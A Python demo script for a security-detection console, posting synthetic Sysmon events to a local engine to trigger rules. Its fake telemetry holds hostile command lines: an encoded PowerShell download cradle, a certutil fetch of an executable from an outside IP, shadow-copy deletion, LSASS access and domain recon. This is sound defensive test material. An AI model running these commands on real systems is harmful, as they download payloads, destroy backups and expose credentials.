#!/usr/bin/env python3
"""Seed the console with a representative set of detections.

Fires enough varied telemetry at a running engine to exercise every surface of
the console at once: rule matches, a correlated phishing-to-recon incident, a
statistical beacon, and a ransomware-prep critical. Use it to see the UI full
rather than clicking through Swagger event by event.

    # with the engine running on :8000
    python scripts/seed_demo.py

Everything targets http://localhost:8000/ingest by default.

Remove-Item data\hunter.db,
python -m alembic upgrade head
"""

from __future__ import annotations

import argparse
import random
import sys
import time
from datetime import datetime, timedelta, timezone

import httpx

BASE = datetime.now(timezone.utc) - timedelta(minutes=20)


def at(offset_seconds: float) -> str:
    """ISO timestamp `offset_seconds` after the base time."""
    return (BASE + timedelta(seconds=offset_seconds)).isoformat()


def event(event_id: int, offset: float, host: str, **data) -> dict:
    """Build a Winlogbeat-shaped Sysmon event."""
    data["UtcTime"] = at(offset)
    return {
        "winlog": {"event_id": event_id, "computer_name": host, "event_data": data},
        "@timestamp": at(offset),
    }


def scenarios() -> list[dict]:
    """Every event to send, in order. Grouped by the story each one tells."""
    events: list[dict] = []

    # ------------------------------------------------------------------ #
    # Story 1 — FIN-WS-07: phishing macro -> recon burst.
    # One process tree. Should collapse into a single high/critical incident
    # carrying SYS-001, SYS-002 and the DSC-001 reconnaissance burst.
    # ------------------------------------------------------------------ #
    host = "FIN-WS-07"
    word, cmd = "{fin-word}", "{fin-cmd}"
    events += [
        event(
            1,
            0,
            host,
            Image=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
            ProcessGuid=word,
            ParentProcessGuid="{fin-explorer}",
            CommandLine=r'"WINWORD.EXE" /n "C:\Users\rlopez\Downloads\Invoice_Q3.docm"',
        ),
        event(
            1,
            6,
            host,
            Image=r"C:\Windows\System32\cmd.exe",
            ParentImage=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
            ProcessGuid=cmd,
            ParentProcessGuid=word,
            CommandLine=r"cmd.exe /c powershell -w hidden -enc "
            r"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
        ),
        event(
            1,
            8,
            host,
            Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            ParentImage=r"C:\Windows\System32\cmd.exe",
            ProcessGuid="{fin-ps}",
            ParentProcessGuid=cmd,
            CommandLine=r"powershell -w hidden -enc "
            r"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA",
        ),
        # reconnaissance burst — four distinct techniques
        event(
            1,
            22,
            host,
            Image=r"C:\Windows\System32\whoami.exe",
            ParentImage=r"C:\Windows\System32\cmd.exe",
            ProcessGuid="{fin-r1}",
            ParentProcessGuid=cmd,
            CommandLine="whoami /all",
        ),
        event(
            1,
            27,
            host,
            Image=r"C:\Windows\System32\net.exe",
            ParentImage=r"C:\Windows\System32\cmd.exe",
            ProcessGuid="{fin-r2}",
            ParentProcessGuid=cmd,
            CommandLine="net user /domain",
        ),
        event(
            1,
            33,
            host,
            Image=r"C:\Windows\System32\systeminfo.exe",
            ParentImage=r"C:\Windows\System32\cmd.exe",
            ProcessGuid="{fin-r3}",
            ParentProcessGuid=cmd,
            CommandLine="systeminfo",
        ),
        event(
            1,
            39,
            host,
            Image=r"C:\Windows\System32\nltest.exe",
            ParentImage=r"C:\Windows\System32\cmd.exe",
            ProcessGuid="{fin-r4}",
            ParentProcessGuid=cmd,
            CommandLine="nltest /domain_trusts",
        ),
    ]

    # ------------------------------------------------------------------ #
    # Story 2 — DEV-WS-11: LSASS credential access + a beacon.
    # A critical rule (SYS-041) plus a statistical beacon on the same host,
    # so the beacon evidence panel is populated.
    # ------------------------------------------------------------------ #
    host = "DEV-WS-11"
    events.append(
        event(
            10,
            60,
            host,
            SourceImage=r"C:\Users\dev\tools\dump.exe",
            TargetImage=r"C:\Windows\System32\lsass.exe",
            GrantedAccess="0x1410",
            ProcessGuid="{dev-dump}",
            ParentProcessGuid="{dev-shell}",
        )
    )
    # beacon: ~45s callbacks with Cobalt-Strike-style jitter
    random.seed(451)
    clock = 70.0
    for _ in range(11):
        events.append(
            event(
                3,
                clock,
                host,
                Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                ProcessGuid="{dev-beacon}",
                DestinationIp="185.234.72.19",
                DestinationPort="443",
            )
        )
        clock += 45 * (1 - random.uniform(0, 0.37))

    # ------------------------------------------------------------------ #
    # Story 3 — HR-WS-03: ransomware preparation.
    # A lone critical: shadow copies deleted. Single-detection incident that is
    # actionable purely on severity.
    # ------------------------------------------------------------------ #
    events.append(
        event(
            1,
            130,
            "HR-WS-03",
            Image=r"C:\Windows\System32\vssadmin.exe",
            ProcessGuid="{hr-vss}",
            ParentProcessGuid="{hr-shell}",
            CommandLine="vssadmin delete shadows /all /quiet",
        )
    )

    # ------------------------------------------------------------------ #
    # Story 4 — scattered single rule hits across hosts, to fill the stream
    # and the technique panel with variety.
    # ------------------------------------------------------------------ #
    events += [
        event(
            1,
            150,
            "SALES-WS-02",
            Image=r"C:\Windows\System32\certutil.exe",
            ProcessGuid="{s-cu}",
            CommandLine=r"certutil -urlcache -f http://203.0.113.9/p.exe p.exe",
        ),
        event(
            13,
            160,
            "SALES-WS-02",
            Image=r"C:\Windows\System32\reg.exe",
            ProcessGuid="{s-reg}",
            TargetObject=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater",
        ),
        event(
            1,
            175,
            "IT-WS-05",
            Image=r"C:\Users\admin\AppData\Local\Temp\svchost.exe",
            ProcessGuid="{it-mq}",
            CommandLine=r"svchost.exe",
        ),
        event(
            11,
            190,
            "IT-WS-05",
            Image=r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE",
            ProcessGuid="{it-xl}",
            TargetFilename=r"C:\Users\admin\AppData\Roaming\update.ps1",
        ),
        event(17, 205, "DEV-WS-11", ProcessGuid="{dev-pipe}", PipeName=r"\msagent_7f"),
    ]

    return events


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Seed the console with demo detections."
    )
    parser.add_argument("--url", default="http://localhost:8000/ingest")
    parser.add_argument(
        "--delay",
        type=float,
        default=0.15,
        help="Seconds between events, so the live feed animates. 0 for a burst.",
    )
    args = parser.parse_args()

    events = scenarios()
    print(f"Sending {len(events)} events to {args.url}")

    fired: dict[str, int] = {}
    incidents: set[str] = set()

    try:
        with httpx.Client(timeout=10.0) as client:
            for i, evt in enumerate(events, 1):
                try:
                    result = client.post(args.url, json=evt).json()
                except httpx.HTTPError as exc:
                    print(f"  ! event {i}: {exc}", file=sys.stderr)
                    continue

                for d in result.get("detections", []):
                    fired[d["rule_id"]] = fired.get(d["rule_id"], 0) + 1
                for inc in result.get("incidents", []):
                    incidents.add(inc["id"])

                if args.delay:
                    time.sleep(args.delay)
    except httpx.ConnectError:
        sys.exit(f"\nCannot reach {args.url}. Is the engine running?")

    print(f"\nDetections fired:")
    for rule_id, count in sorted(fired.items()):
        print(f"  {rule_id:10} x{count}")
    print(
        f"\n{len(incidents)} incident(s) raised. Open http://localhost:8000 to triage."
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
